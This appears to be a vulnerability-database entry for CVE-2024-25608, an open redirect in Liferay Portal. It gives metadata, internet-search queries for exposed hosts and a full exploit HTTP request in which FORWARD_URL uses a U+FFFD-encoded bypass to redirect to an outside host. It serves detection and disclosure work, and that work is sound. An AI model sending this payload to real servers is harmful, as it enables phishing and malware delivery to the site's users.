---
layout: post
cve_id: CVE-2024-25608
title: Liferay Portal - Open Redirect
pcap: true
pcap_path: /pcaps/2024/CVE-2024-25608.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-25608.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: medium
impact: 'Attackers can redirect users to arbitrary external URLs, potentially leading
  to phishing or malware distribution.

  '
remediation: 'Update to the latest supported versions of Liferay Portal and DXP, applying
  all security patches.

  '
reference:
- https://liferay.dev/portal/security/known-vulnerabilities/-/asset_publisher/jekt/content/cve-2024-25608
- https://github.com/liferay/liferay-portal/commit/aea651fa5110934b6a00d93391fac87985e27786
- https://github.com/liferay/liferay-portal/commit/36adf82ef7a09c7035d4f19a1982dcde1ae3f6ae
- https://nvd.nist.gov/vuln/detail/CVE-2024-25608
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2024-25608
  epss-score: 0.15402
  epss-percentile: 0.94425
  cwe-id: CWE-601
  cpe: cpe:2.3:a:liferay:digital_experience_platform:*:*:*:*:*:*:*:*,cpe:2.3:a:liferay:liferay_portal:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: liferay
  product: digital_experience_platform,liferay_portal
  shodan-query: http.favicon.hash:129457226
  fofa-query: icon_hash=129457226
tags:
- cve
- cve2019
- liferay
- liferay-portal
- digital-experience-platform
- open-redirect
- vkev
---

## üîç Vulnerability Description
HtmlUtil.escapeRedirect in Liferay Portal 7.2.0 through 7.4.3.18, and older unsupported versions, and Liferay DXP 7.4 before update 19, 7.3 before update 4, 7.2 before fix pack 19, and older unsupported versions can be circumvented by using the 'REPLACEMENT CHARACTER' (U+FFFD), which allows remote attackers to redirect users to arbitrary external URLs via the (1) 'redirect` parameter (2) `FORWARD_URL` parameter, (3) `noSuchEntryRedirect` parameter, and (4) others parameters that rely on HtmlUtil.escapeRedirect.


## üåê HTTP Request
```nohighlight
GET /html/common/forward_jsp.jsp?FORWARD_URL=http://oast.me%EF%BF%BD@localhost HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

